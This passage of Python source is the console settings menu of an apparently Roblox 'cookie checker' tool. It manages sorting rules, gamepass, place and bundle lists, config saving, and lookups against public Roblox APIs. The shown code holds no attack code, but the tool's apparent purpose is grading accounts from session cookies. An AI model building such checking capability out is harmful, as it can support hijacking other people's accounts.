                                                                    if settingsRCCGeneralSortCategoryTab == '0': whileTrueStage5 = False
                                                                    elif settingsRCCGeneralSortCategoryTab.isdigit() and int(settingsRCCGeneralSortCategoryTab) <= len(sortValues):
                                                                        whileTrueStage6 = True
                                                                        await cls()
                                                                        await lableASCII()
                                                                        while whileTrueStage6:
                                                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Sorting}\\{' '.join(list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1].split('_'))}\\{sortValues[int(settingsRCCGeneralSortCategoryTab) - 1]}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][1][sortValues.index(sortValues[int(settingsRCCGeneralSortCategoryTab) - 1])][1] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Sort}\n [{ANSI.FG.RED}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                            settingsRCCGeneralSortValueContextMenuTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                            match settingsRCCGeneralSortValueContextMenuTab.upper():
                                                                                case 'C' | 'С':
                                                                                    config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][1][sortValues.index(sortValues[int(settingsRCCGeneralSortCategoryTab) - 1])][1] ^= True
                                                                                    await autoSaveConfig()
                                                                                    await removeLines(7)
                                                                                case '0':
                                                                                    whileTrueStage6 = False
                                                                                    await removeLines(7)
                                                                                case 'D' | 'В':
                                                                                    if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                                                                                        whileTrueStage7 = True
                                                                                        await removeLines(7)
                                                                                        while whileTrueStage7:
                                                                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Sorting}\\{' '.join(list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1].split('_'))}\\{sortValues[int(settingsRCCGeneralSortCategoryTab) - 1]}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                                                                                            confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                                            match confirmTheAction.upper():
                                                                                                case 'Y' | 'Н':
                                                                                                    whileTrueStage6 = False
                                                                                                    whileTrueStage7 = False
                                                                                                    config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][1].pop(int(settingsRCCGeneralSortCategoryTab) - 1)
                                                                                                    await autoSaveConfig()
                                                                                                case 'N' | 'Т':
                                                                                                    whileTrueStage7 = False

                                                                                            await removeLines(8)
                                                                                    else:
                                                                                        whileTrueStage6 = False
                                                                                        config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][1].pop(int(settingsRCCGeneralSortCategoryTab) - 1)
                                                                                        await autoSaveConfig()
                                                                                        await removeLines(7)
                                                                                case 'F' | 'А':
                                                                                    await cls()
                                                                                    await lableASCII()
                                                                                case _:
                                                                                    await removeLines(7)
                                                                    elif settingsRCCGeneralSortCategoryTab in ('+', '='):
                                                                        for sortValue in sortValues:
                                                                            config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][1][sortValues.index(sortValue)][1] = True
                                                                        await autoSaveConfig()
                                                                    elif settingsRCCGeneralSortCategoryTab in ('-', '_'):
                                                                        for sortValue in sortValues:
                                                                            config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][1][sortValues.index(sortValue)][1] = False
                                                                        await autoSaveConfig()
                                                                    elif settingsRCCGeneralSortCategoryTab.upper() in ('A', 'Ф'):
                                                                        await cls()
                                                                        await lableASCII()
                                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Sorting}\\{' '.join(list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1].split('_'))}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cancel}{ANSI.CLEAR}\n\n')
                                                                        settingsRCCGeneralSortParameterAdd = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_The_Parameter_Value}:{ANSI.CLEAR} ')

                                                                        async def addSortParameter():
                                                                            if settingsRCCGeneralSortParameterAdd == '0': return
                                                                            if not settingsRCCGeneralSortParameterAdd.isdigit():
                                                                                return await errorOrCorrectHandler(True, 5, MT_The_Parameter_Can_Only_Be_A_Number,       f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Sorting}\\{' '.join(list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1].split('_'))}')
                                                                            if int(settingsRCCGeneralSortParameterAdd) in [parameter[0] for parameter in config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][1]]:
                                                                                return await errorOrCorrectHandler(True, 5, MT_Parameter_With_This_Value_Already_Exists, f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Sorting}\\{' '.join(list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1].split('_'))}')
                                                                            if len(str(settingsRCCGeneralSortParameterAdd)) > 20:
                                                                                return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_Parameter_20,         f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Sorting}\\{' '.join(list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1].split('_'))}')

                                                                            config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][1].append([int(settingsRCCGeneralSortParameterAdd), False])
                                                                            await autoSaveConfig()

                                                                        await addSortParameter()
                                                                    elif settingsRCCGeneralSortCategoryTab.upper() in ('C', 'С'):
                                                                        config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]][0] ^= True
                                                                        await autoSaveConfig()
                                                                    elif settingsRCCGeneralSortCategoryTab.upper() in ('R', 'К'):
                                                                        loadConfig(configLoader['Loader']['Current_Config'])

                                                                    await cls()
                                                                    await lableASCII()
                                                            elif cookieDataCategories[list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]] == str:
                                                                config['Roblox']['CookieChecker']['Sorting'][list(cookieDataCategories)[int(settingsRCCGeneralSortTab) - 1]] ^= True
                                                            await autoSaveConfig()
                                                        elif settingsRCCGeneralSortTab in ('+', '='):
                                                            for category in cookieDataCategories:
                                                                if   cookieDataCategories[category] == int and config['Roblox']['CookieChecker']['Sorting'][category][1]: config['Roblox']['CookieChecker']['Sorting'][category][0] = True
                                                                elif cookieDataCategories[category] == str:                                                               config['Roblox']['CookieChecker']['Sorting'][category]    = True 
                                                            await autoSaveConfig()
                                                        elif settingsRCCGeneralSortTab in ('-', '_'):
                                                            for category in cookieDataCategories:
                                                                if   cookieDataCategories[category] == int: config['Roblox']['CookieChecker']['Sorting'][category][0] = False
                                                                elif cookieDataCategories[category] == str: config['Roblox']['CookieChecker']['Sorting'][category]    = False 
                                                            await autoSaveConfig()
                                                        elif settingsRCCGeneralSortTab.upper() in ('S', 'Ы'):
                                                            config['Roblox']['CookieChecker']['Sorting']['Sort'] ^= True
                                                            await autoSaveConfig()
                                                        elif settingsRCCGeneralSortTab.upper() in ('R', 'К'):
                                                            loadConfig(configLoader['Loader']['Current_Config'])

                                                        await cls()
                                                        await lableASCII()
                                                # Основные
                                                case '4':
                                                    whileTrueStage4 = True
                                                    await removeLines(12)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}{ANSI.CLEAR}\n\n  {ANSI.FG.RED}*{ANSI.CLEAR + ANSI.DECOR.BOLD}   - +1 {MT_Request.lower()}{ANSI.CLEAR}\n  {ANSI.FG.YELLOW}* {ANSI.FG.BLUE}*{ANSI.CLEAR + ANSI.DECOR.BOLD} - {MT_Everything_Or_Something_Is_On} +1 {MT_Request.lower()}{ANSI.CLEAR}\n  {ANSI.FG.GREEN}*{ANSI.CLEAR + ANSI.DECOR.BOLD}   - {MT_Everything_Is_On_Or_Off} +1 {MT_Request.lower()}{ANSI.CLEAR}\n\n')
                                                        printRCCGeneral()
                                                        sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRCCMainTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        if settingsRCCMainTab == '0': whileTrueStage4 = False
                                                        # Custom Gamepasses | Favorite Places | Bundles
                                                        elif settingsRCCMainTab.isdigit() and int(settingsRCCMainTab) <= len(cookieData.listOfCookieData) and cookieData.listOfCookieData[int(settingsRCCMainTab) - 1][0] in ('Custom Gamepasses', 'Favorite Places', 'Bundles'):
                                                            nameOfCategory  = str(cookieData.listOfCookieData[int(settingsRCCMainTab) - 1][0])
                                                            nameOfCategory_ = '_'.join(nameOfCategory.replace('(', '').replace(')', '').split(' '))
                                                            labels = {
                                                                'Custom Gamepasses': [MT_Add_A_Gamepass_Name, MT_Enter_The_Gamepass_Name],
                                                                'Favorite Places':   [MT_Add_A_Place_By_ID,   MT_Enter_The_Place_ID],
                                                                'Bundles':           [MT_Add_A_Bundle_By_ID,  MT_Enter_The_Bundle_ID]
                                                            }
                                                            whileTrueStage5 = True
                                                            await cls()
                                                            await lableASCII()
                                                            while whileTrueStage5:
                                                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\{nameOfCategory}\n\n{ANSI.CLEAR}')
                                                                await RCCGeneralCategory(True, nameOfCategory_)
                                                                sys.stdout.write(f'{ANSI.DECOR.BOLD}{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n' if config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory_}_List'] else ''} [{ANSI.FG.YELLOW}A{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {labels[nameOfCategory][0]}\n [{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Main'][nameOfCategory_] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Check}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                settingsRCCGeneralCategoryTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                if settingsRCCGeneralCategoryTab == '0': whileTrueStage5 = False
                                                                elif settingsRCCGeneralCategoryTab.isdigit() and int(settingsRCCGeneralCategoryTab) <= len(config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory_}_List']):
                                                                    whileTrueStage6 = True
                                                                    await cls()
                                                                    await lableASCII()
                                                                    while whileTrueStage6:
                                                                        categoryItems = await RCCGeneralCategory(categoryName=nameOfCategory_)
                                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\{nameOfCategory}\\{categoryItems[int(settingsRCCGeneralCategoryTab) - 1][-2]}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if categoryItems[int(settingsRCCGeneralCategoryTab) - 1][-1] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Check}\n [{ANSI.FG.RED}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                        settingsRCCGeneralCustomGamepassContextMenuTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                        match settingsRCCGeneralCustomGamepassContextMenuTab.upper():
                                                                            case 'C' | 'С':
                                                                                config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory_}_List'][int(settingsRCCGeneralCategoryTab) - 1][-1] ^= True
                                                                                await autoSaveConfig()
                                                                                await removeLines(7)
                                                                            case 'D' | 'В':
                                                                                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                                                                                    whileTrueStage7 = True
                                                                                    await removeLines(7)
                                                                                    while whileTrueStage7:
                                                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\{nameOfCategory}\\{categoryItems[int(settingsRCCGeneralCategoryTab) - 1][1]}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                                                                                        confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                                        match confirmTheAction.upper():
                                                                                            case 'Y' | 'Н':
                                                                                                whileTrueStage6 = False
                                                                                                whileTrueStage7 = False
                                                                                                removeItemFromCategory(config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory_}_List'], categoryItems[int(settingsRCCGeneralCategoryTab) - 1][-2])
                                                                                                await autoSaveConfig()
                                                                                            case 'N' | 'Т':
                                                                                                whileTrueStage7 = False

                                                                                        await removeLines(8)
                                                                                else:
                                                                                    whileTrueStage6 = False
                                                                                    removeItemFromCategory(config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory_}_List'], categoryItems[int(settingsRCCGeneralCategoryTab) - 1][-2])
                                                                                    await autoSaveConfig()
                                                                                    await removeLines(7)
                                                                            case '0':
                                                                                whileTrueStage6 = False
                                                                                await removeLines(7)
                                                                            case 'F' | 'А':
                                                                                await cls()
                                                                                await lableASCII()
                                                                            case 'R' | 'К':
                                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                                                await removeLines(7)
                                                                            case _:
                                                                                await removeLines(7)
                                                                elif settingsRCCGeneralCategoryTab.upper() in ('A', 'Ф'):
                                                                    await cls()
                                                                    await lableASCII()
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\{nameOfCategory}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cancel}{ANSI.CLEAR}\n\n')
                                                                    settingsRCCGeneralCategoryItemAdd = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {labels[nameOfCategory][1]}:{ANSI.CLEAR} ')
                                                                    match nameOfCategory:
                                                                        case 'Custom Gamepasses':
                                                                            async def addCustomGamepass():
                                                                                if settingsRCCGeneralCategoryItemAdd == '0': return
                                                                                if settingsRCCGeneralCategoryItemAdd.replace(' ', '') == '':
                                                                                    return await errorOrCorrectHandler(True, 5, MT_The_Name_Cannot_Be_Empty,               f'{MT_Settings}\\{MT_Cookie_Checker}\\{MT_Main}\\{nameOfCategory}')
                                                                                if len(settingsRCCGeneralCategoryItemAdd) > 100:
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_Name_50,            f'{MT_Settings}\\{MT_Cookie_Checker}\\{MT_Main}\\{nameOfCategory}')
                                                                                if checkExist(settingsRCCGeneralCategoryItemAdd, nameOfCategory_):
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Gamepass_With_This_Name_Already_Exists, f'{MT_Settings}\\{MT_Cookie_Checker}\\{MT_Main}\\{nameOfCategory}')

                                                                                config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_List'].append([settingsRCCGeneralCategoryItemAdd, False])
                                                                                await autoSaveConfig()
                                                                            
                                                                            await addCustomGamepass()
                                                                        case 'Favorite Places':
                                                                            async def addFavPlace():
                                                                                if settingsRCCGeneralCategoryItemAdd == '0': return
                                                                                if not settingsRCCGeneralCategoryItemAdd.isdigit():
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrent_Place_ID,                f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\Favorite Places')
                                                                                if len(settingsRCCGeneralCategoryItemAdd) > 20:
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_ID_50,         f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\Favorite Places')
                                                                                if checkExist(settingsRCCGeneralCategoryItemAdd, nameOfCategory_):
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Place_With_This_ID_Already_Exists, f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\Favorite Places')

                                                                                requestUniverseId = requests.get(f'https://apis.roblox.com/universes/v1/places/{settingsRCCGeneralCategoryItemAdd}/universe').json()['universeId']

                                                                                if requestUniverseId == None:
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrent_Place_ID,                f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\Favorite Places')

                                                                                requestFavPlaceInfo = requests.get(f'https://games.roblox.com/v1/games?universeIds={requestUniverseId}').json()

                                                                                config['Roblox']['CookieChecker']['Main']['Favorite_Places_List'].append([int(settingsRCCGeneralCategoryItemAdd), requestFavPlaceInfo['data'][0]['name'], False])
                                                                                await autoSaveConfig()

                                                                            await addFavPlace()
                                                                        case 'Bundles':
                                                                            async def addBundle():
                                                                                if settingsRCCGeneralCategoryItemAdd == '0': return
                                                                                if not settingsRCCGeneralCategoryItemAdd.isdigit():
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrent_Bundle_ID,                f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\Bundles')
                                                                                if len(settingsRCCGeneralCategoryItemAdd) > 20:
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_ID_50,          f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\Bundles')
                                                                                if checkExist(settingsRCCGeneralCategoryItemAdd, nameOfCategory_):
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Bundle_With_This_ID_Already_Exists, f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\Bundles')

                                                                                requestBundleInfo = requests.get(f'https://catalog.roblox.com/v1/bundles/{settingsRCCGeneralCategoryItemAdd}/details').json()

                                                                                if 'errors' in requestBundleInfo:
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrent_Bundle_ID,                f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Main}\\Bundles')

                                                                                config['Roblox']['CookieChecker']['Main']['Bundles_List'].append([int(settingsRCCGeneralCategoryItemAdd), requestBundleInfo['name'], False])
                                                                                await autoSaveConfig()

                                                                            await addBundle()
                                                                elif settingsRCCGeneralCategoryTab in ('+', '='):
                                                                    for item in config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory_}_List']:
                                                                        item[-1] = True
                                                                    await autoSaveConfig()
                                                                elif settingsRCCGeneralCategoryTab in ('-', '_'):
                                                                    for item in config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory_}_List']:
                                                                        item[-1] = False
                                                                    await autoSaveConfig()
                                                                elif settingsRCCGeneralCategoryTab.upper() in ('C', 'С'):
                                                                    config['Roblox']['CookieChecker']['Main'][f'{nameOfCategory_}'] ^= True
                                                                    await autoSaveConfig()
                                                                elif settingsRCCGeneralCategoryTab.upper() in ('R', 'К'):
                                                                    loadConfig(configLoader['Loader']['Current_Config'])

                                                                await cls()
                                                                await lableASCII()
                                                        elif settingsRCCMainTab.isdigit() and int(settingsRCCMainTab) <= len(cookieData.listOfCookieData):
                                                            config['Roblox']['CookieChecker']['Main'][cookieData.listOfCookieData[int(settingsRCCMainTab) - 1][1]] ^= True
                                                            await autoSaveConfig()
                                                        elif settingsRCCMainTab in ('+', '='):
                                                            for i in range(len(cookieData.listOfCookieData)):
                                                                config['Roblox']['CookieChecker']['Main'][cookieData.listOfCookieData[i][1]] = True
                                                            await autoSaveConfig()
                                                        elif settingsRCCMainTab in ('-', '_'):
                                                            for i in range(len(cookieData.listOfCookieData)):
                                                                config['Roblox']['CookieChecker']['Main'][cookieData.listOfCookieData[i][1]] = False
                                                            await autoSaveConfig()
                                                        elif settingsRCCMainTab.upper() in ('R', 'К'):
                                                            loadConfig(configLoader['Loader']['Current_Config'])

                                                        await cls()
                                                        await lableASCII()
                                                # Плейсы
                                                case '5':
                                                    whileTrueStage4 = True
                                                    await removeLines(12)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Places}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n\n')
                                                        printRCCPlaces()
                                                        sys.stdout.write(f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRCCPlacesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        if settingsRCCPlacesTab == '0': whileTrueStage4 = False
                                                        elif settingsRCCPlacesTab.isdigit() and int(settingsRCCPlacesTab) <= len(listOfPlaces):
                                                            await RCCPlaceContextMenu(int(settingsRCCPlacesTab) - 1)
                                                        elif settingsRCCPlacesTab in ('+', '='):
                                                            for place in listOfPlaces:
                                                                config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] = True
                                                            await autoSaveConfig()
                                                        elif settingsRCCPlacesTab in ('-', '_'):
                                                            for place in listOfPlaces:
                                                                config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] = False
                                                            await autoSaveConfig()

                                                        await cls()
                                                        await lableASCII()
                                                # Кастомные плейсы
                                                case '6':
                                                    whileTrueStage4 = True
                                                    await removeLines(12)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n\n')
                                                        await printRCCCustomPlaces()
                                                        sys.stdout.write(f'{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n' if config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'] else ''} [{ANSI.FG.YELLOW}A{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Add_A_Place_By_ID}\n [{ANSI.FG.YELLOW}S{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['CustomPlaces']['Show_Game_ID_Next_To_The_Name'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Show_Place_ID_Next_To_The_Name}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRCCCustomPlacesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        if settingsRCCCustomPlacesTab == '0': whileTrueStage4 = False
                                                        elif settingsRCCCustomPlacesTab.isdigit() and int(settingsRCCCustomPlacesTab) <= len(config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']):
                                                            await RCCCustomPlaceContextMenu(int(settingsRCCCustomPlacesTab) - 1)
                                                        elif settingsRCCCustomPlacesTab.upper() in ('A', 'Ф'):
                                                            await cls()
                                                            await lableASCII()
                                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cancel}{ANSI.CLEAR}\n\n')
                                                            settingsRCCCustomPlaceAdd = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_The_Place_ID}:{ANSI.CLEAR} ')

                                                            async def addCustomPlace():
